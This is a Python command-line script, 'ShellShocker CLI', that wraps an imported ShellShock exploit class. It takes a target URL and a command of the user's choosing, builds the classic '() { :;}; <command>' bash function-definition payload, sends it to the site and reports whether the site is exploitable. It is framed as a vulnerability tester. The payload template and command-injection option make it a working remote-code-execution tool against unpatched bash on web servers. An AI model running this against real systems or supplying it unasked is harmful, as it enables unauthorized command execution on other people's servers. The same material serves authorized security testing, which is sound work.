#!/usr/bin/env python

"""
ShellShocker CLI
================
The CLI for ShellShocker.
Interfaces to **shellshocker.exploits.ShellShocker**, a ShellShock exploiter
"""

from shellshocker.exploits import ShellShocker # Import a shellshock payload generator
# and delivery device.
import click # Click is Armin Ronacher's new CLI framework. It's awesomesauce.

@click.command()
@click.argument('url')
@click.option('-v', '--verbose', is_flag=True, help='Make the tester more verbose for debugging')
@click.option('-c', '--commands', help='Command to inject into the payload')
@click.option('-p', '--payload', type=click.Choice(['traditional', 'new']), help='Choose between the original bug and the new one')
def test_site(url, verbose, commands, payload):
  """
  Test the URL `URL` for ShellShock vulnerability.
  """
  click.echo("Testing {url} with a standard payload using ShellShocker".format(url=url))


  if verbose:
    click.echo("Creating instance of exploit on {url}".format(url=url))
    if commands is not None:
      click.echo("Using commands {commands}".format(commands=commands))
    else:
      click.echo("Using default commands")
    if payload is not None:
      click.echo("Using the {payload} payload".format(payload=payload))
    else:
      click.echo("Using default payload")

  if payload == 'traditional':
    payloadstring = '() {{ :;}}; {commands}'
  elif payload == 'new':
    raise NotImplementedError("Not supported yet")
  else:
    payloadstring = '() {{ :;}}; {commands}'

  # Create a instance of the exploiter
  shocker = ShellShocker({'url': url, 'commands': commands, 'payload': payloadstring})

  if verbose:
    shocker.verbose = True

  if verbose:
    click.echo("Sending exploit to {url}".format(url=url))

  # Is it exploitable?
  exploitable = shocker.exploitable()

  click.echo(click.style("{url} is exploitable".format(url=url), fg="red") if exploitable else click.style("{url} is not exploitable".format(url=url), fg="green"))

if __name__ == '__main__':
  """
  If this is being run as a script
  """
  test_site()
